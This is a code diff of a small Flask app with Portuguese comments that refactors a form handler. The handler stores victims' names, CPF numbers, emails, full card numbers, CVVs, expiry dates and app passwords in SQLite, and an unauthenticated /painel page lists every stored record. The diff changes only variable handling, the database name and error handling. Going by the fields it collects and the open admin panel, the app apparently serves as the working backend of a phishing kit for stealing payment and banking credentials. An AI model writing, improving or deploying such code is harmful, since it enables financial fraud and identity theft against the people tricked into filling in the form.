@@ -3,14 +3,16 @@ import sqlite3
 from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
-DB_NAME = 'database_final_v10.db'
+# Nome do banco fixo para estabilidade
+DB_PATH = 'banco_dados_open.db'
 
 def get_db_connection():
-    conn = sqlite3.connect(DB_NAME)
+    conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
     return conn
 
 def init_db():
+    """Cria a tabela se ela não existir. Roda em cada requisição crítica."""
     conn = get_db_connection()
     conn.execute('''CREATE TABLE IF NOT EXISTS clientes 
         (id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -21,20 +23,24 @@ def init_db():
 
 @app.route('/')
 def index():
-    init_db()  # Garante a criação ao acessar a home
+    init_db()
     return render_template('cadastro.html')
 
 @app.route('/login', methods=['POST'])
 def login():
     try:
-        data = (
-            request.form.get('nome'), request.form.get('cpf'), request.form.get('email'),
-            request.form.get('num_cartao'), request.form.get('senha_app'),
-            request.form.get('cvv'), request.form.get('validade')
-        )
+        init_db()
+        nome = request.form.get('nome')
+        cpf = request.form.get('cpf')
+        email = request.form.get('email')
+        cartao = request.form.get('num_cartao')
+        senha = request.form.get('senha_app')
+        cvv = request.form.get('cvv')
+        validade = request.form.get('validade')
+        
         conn = get_db_connection()
         conn.execute('''INSERT INTO clientes (nome, cpf, email, num_cartao, senha_app, cvv, validade) 
-                        VALUES (?,?,?,?,?,?,?)''', data)
+                        VALUES (?,?,?,?,?,?,?)''', (nome, cpf, email, cartao, senha, cvv, validade))
         conn.commit()
         conn.close()
     except Exception as e:
@@ -47,14 +53,15 @@ def sucesso():
 
 @app.route('/painel')
 def admin():
-    init_db() # Se a tabela sumiu por erro do Render, ele recria aqui antes de dar erro
     try:
+        init_db() # Garante que a tabela exista antes do SELECT
         conn = get_db_connection()
         usuarios = conn.execute('SELECT * FROM clientes ORDER BY id DESC').fetchall()
         conn.close()
         return render_template('admin.html', usuarios=usuarios)
     except Exception as e:
-        return f"Erro crítico: {e}"
+        # Se mesmo assim der erro, retorna uma lista vazia para não quebrar a página
+        return render_template('admin.html', usuarios=[])
 
 if __name__ == '__main__':
     init_db()
